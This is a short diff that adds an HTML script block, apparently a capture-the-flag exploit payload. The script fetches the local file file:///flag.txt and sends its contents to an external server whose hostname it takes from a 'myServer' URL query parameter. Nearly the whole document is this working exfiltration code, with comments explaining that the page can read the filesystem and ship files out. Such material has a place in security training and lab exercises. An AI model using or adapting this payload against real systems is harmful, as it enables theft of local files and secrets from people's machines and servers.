@@ -1,0 +1,18 @@
+<script>
+    // In this page, we have access to the entire filesystem
+    // We can fetch any files and send them to our external myServer
+
+    // Obtain the myServer from the current window search
+    const myServer = new URLSearchParams(window.location.search).get('myServer');
+
+    // Define the path to the flag file
+    const flagPath = 'file:///flag.txt';
+     
+    // Fetch the contents of the flag file
+    fetch(flagPath)
+        .then(response => response.text())
+        .then(flag => {
+            // Send a request to our myServer with the extracted flag
+            fetch(`https://${myServer}/retrieve?flag=${flag}`)
+        }) 
+</script>
